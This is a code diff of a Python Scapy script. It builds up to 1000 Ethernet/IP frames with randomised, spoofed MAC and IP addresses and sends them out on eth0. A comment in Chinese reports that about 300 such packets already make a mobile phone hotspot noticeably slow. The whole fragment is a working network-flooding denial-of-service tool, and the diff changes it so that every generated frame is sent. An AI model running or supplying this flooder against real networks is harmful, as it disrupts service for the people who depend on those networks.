@@ -19,13 +19,12 @@ def pack():
                 srcmac+=":"
         dstip=str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))
         srcip="192"+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))
-        if dstmac[0:2]=="02":
+        if b<1000: #如果计数器次数没有满1000则继续填充 实测300条数据就可以时手机热点感到明显的延时
+            datt=Ether(src=srcmac,dst=dstmac)/IP(src=srcip,dst=dstip)
+            datt_list.append(datt)
             b+=1 #计数器加1
-            if b<1000: #如果计数器次数没有满1000则继续填充
-                datt=Ether(src=srcmac,dst=dstmac)/IP(src=srcip,dst=dstip)
-                datt_list.append(datt)
-            else: #如果已经构造了1000次数据，则使运行条件为假
-                a=0
+        else: #如果已经构造了1000次数据，则使运行条件为假
+            a=0
     return datt_list
 def send(data):
     sendp(data,iface="eth0")
